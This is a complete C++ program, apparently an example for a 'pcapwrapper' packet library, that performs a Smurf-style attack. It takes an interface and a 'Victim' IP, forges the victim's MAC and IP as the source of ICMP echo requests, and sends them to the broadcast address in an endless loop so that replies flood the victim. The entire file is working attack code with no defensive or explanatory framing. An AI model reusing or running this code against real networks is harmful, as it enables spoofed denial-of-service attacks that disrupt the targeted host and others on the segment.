#include <iostream>
#include <memory>

#include <pcapwrapper/controller.hpp>
#include <pcapwrapper/helpers/common.h>
#include <pcapwrapper/helpers/helper.h>
#include <pcapwrapper/interfaces/interface.h>
#include <pcapwrapper/network/builders/builder.h>
#include <pcapwrapper/network/builders/keys.h>
#include <pcapwrapper/network/packages/icmppackage.h>
#include <pcapwrapper/processors/processorempty.h>

int main(int argc, char *argv[]) {

    if (argc != 3) {
        std::cout << "1. Interface\n";
        std::cout << "2. Victim\n";
        return -1;
    }

    std::string interface_name = argv[1];
    const auto target_ip = PCAP::IpAddress(argv[2]);
    const auto target_mac =
        PCAP::PCAPHelper::get_mac(target_ip, interface_name);
    const auto broadcast_ip =
        PCAP::PCAPHelper::get_broadcast_ip(interface_name);

    auto controller = std::make_shared<
        PCAP::Controller<PCAP::Interface, PCAP::ProcessorEmpty>>(
        interface_name);

    std::cout << "Started" << std::endl;

    while (1) {
        using namespace PCAP::PCAPBuilder;
        auto package = PCAP::PCAPBuilder::make_icmp(std::map<Keys, Option>{
            {Keys::Key_Eth_Mac_Src, Option{target_mac}},
            {Keys::Key_Eth_Mac_Dst,
             Option{PCAP::MacAddress(std::string("FF:FF:FF:FF:FF:FF"))}},
            {Keys::Key_Ip_Src, Option{target_ip}},
            {Keys::Key_Ip_Dst, Option{broadcast_ip}},
            {Keys::Key_Icmp_Code, Option{(PCAP::uchar)0x00}},
            {Keys::Key_Icmp_Type, Option{(PCAP::uchar)0x08}}});
        package.recalculate_checksums();
        controller->write(package.get_package(), package.get_length());

        using namespace std::chrono_literals;
        std::this_thread::sleep_for(2s);
    }
}
